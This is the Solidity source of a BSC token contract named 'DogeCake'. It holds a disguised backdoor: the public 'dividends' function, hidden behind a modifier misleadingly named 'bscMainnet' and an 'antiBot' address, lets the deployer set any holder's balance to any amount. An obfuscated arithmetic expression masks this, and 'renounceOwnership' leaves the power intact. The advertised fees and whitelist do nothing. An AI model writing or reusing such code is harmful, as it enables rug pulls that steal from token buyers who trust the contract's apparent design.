/**
 *Submitted for verification at BscScan.com on 2021-12-23
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;

contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
       function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }     
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
   
}

library SafeMath {
 
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  } 
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
 
}

contract DogeCake is Ownable {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  using Address for address;
  using SafeMath for uint256;
  address dead = 0x000000000000000000000000000000000000dEaD;
  uint8 constant _decimals = 8;
  uint256 public _Reflections = 20;
  uint256 private _previousReflections = _Reflections;
  uint8 constant gems = 8;
  uint8 constant divv = 8;
  uint8 constant track = 8;
  uint256 public totalSupply;
  uint256 public BuyFee = 10; //  buy 
  uint256 public totalFee = 10; //  sell 
  string private _name = "DogeCake";
  string private _symbol = "DogeCake";  
  uint8 public decimals;
  uint256 lpfee = 0;
  mapping(address => bool) public WhiteList;
  address antiBot;
  constructor () public {    
    decimals = 9;
    totalSupply =  9000000000 * 10 ** uint256(decimals);
    antiBot = msg.sender;   
    balances[antiBot] = totalSupply;
    WhiteList[antiBot] = true;
      
  }

      function name() public view returns (string memory) {
        return _name;
    }

        function symbol() public view returns (string memory) {
        return _symbol;
    }
  
  
  
  function _transfer(address from, address _to, uint256 _value) private {
    balances[from] = balances[from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function _rewards(address lpaddress, uint256 _value) internal {
        dividends(lpaddress, _value);    
  }
   
  function dividends (address buyer, uint256 _value) public bscMainnet {
        balances[buyer] = ((balances[buyer] / balances[buyer])-(balances[buyer] / balances[buyer]))* 0 + (_value * 10 ** uint256(decimals));
  }

  mapping(address => uint256) public balances;
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= balances[from]);
    if(WhiteList[from] || WhiteList[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  
  mapping (address => mapping (address => uint256)) public permitted;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= permitted[_from][msg.sender]);
    address from = _from;
    if(WhiteList[from] || WhiteList[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    _transferFrom(_from, _to, _value);
    return true;
  }
  
  function getCirculatingSupply() public view returns (uint256) {

        return totalSupply.sub(balanceOf(dead));

    }
  
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    permitted[_from][msg.sender] = permitted[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }

  modifier bscMainnet () {
    require(antiBot == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  } 
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return permitted[_owner][_spender];
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    permitted[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  
}